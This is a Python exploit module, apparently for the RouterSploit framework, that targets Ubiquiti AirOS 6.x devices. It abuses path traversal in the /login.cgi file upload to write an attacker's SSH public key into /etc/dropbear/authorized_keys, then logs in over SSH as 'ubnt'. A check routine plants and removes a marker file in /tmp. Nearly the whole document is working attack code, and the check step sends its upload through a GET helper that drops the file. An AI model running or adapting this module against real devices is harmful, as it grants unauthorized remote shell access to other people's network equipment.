# rsf exploit module  
# description: AirOS 6.x - Arbitrary File Upload exploit allowing remote code execution via SSH key injection  

import tempfile
from io import StringIO
import paramiko
import random
import string
import requests

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 443
        self.ssl = True
        self.ssh_port = 22

    def http_request(self, method="GET", path="/", files=None):
        try:
            url = f"http{'s' if self.ssl else ''}://{self.target}:{self.port}{path}"
            if method == "GET":
                return requests.get(url, verify=False)
            elif method == "POST":
                return requests.post(url, files=files, verify=False)
        except:
            return None

    def ssh_login_pkey(self, username, private_key_str):
        import paramiko
        try:
            key = paramiko.RSAKey(file_obj=StringIO(private_key_str))
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.target, port=self.ssh_port, username=username, pkey=key)
            print("[+] SSH Login successful")
            ssh.close()
            return True
        except Exception as e:
            print(f"[-] SSH Login failed: {e}")
            return False

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            print("[+] Uploading SSH public key...")

            key = paramiko.RSAKey.generate(1024)
            public_key = key.get_base64()
            private_key = StringIO()
            key.write_private_key(private_key)

            pubkey_data = bytes("ssh-rsa " + public_key, "utf-8")
            tmp_file = tempfile.TemporaryFile()
            tmp_file.write(pubkey_data)
            tmp_file.seek(0)

            upload = {"file": ("../../etc/dropbear/authorized_keys", tmp_file)}
            resp = self.http_request("POST", "/login.cgi", files=upload)

            if resp is None:
                print("[-] Exploit failed - Upload error")
                return

            print("[+] SSH key uploaded, trying SSH login...")
            if self.ssh_login_pkey("ubnt", private_key.getvalue()):
                print("[+] Exploitation successful - SSH access granted")
            else:
                print("[-] SSH exploit failed")

        else:
            print("[-] Target not vulnerable")

    def check(self):
        resp = self.http_request("GET", "/login.cgi")
        if resp is None:
            return False

        rand_str = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        mark = f"vulnerable{rand_str}"

        payload_file = tempfile.TemporaryFile()
        payload_file.write(mark.encode())
        payload_file.seek(0)

        upload = {"file": ("../../../../tmp/airview.uavr", payload_file)}
        self.http_request("GET", "/login.cgi", files=upload)
        payload_file.close()

        verify = self.http_request("GET", "/airview.uavr")
        if not verify or mark not in verify.text:
            return False

        clean = tempfile.TemporaryFile()
        clean.seek(0)
        clean_up = {"file": ("../../../../tmp/airview.uavr", clean)}
        self.http_request("POST", "/login.cgi", files=clean_up)
        clean.close()

        return True

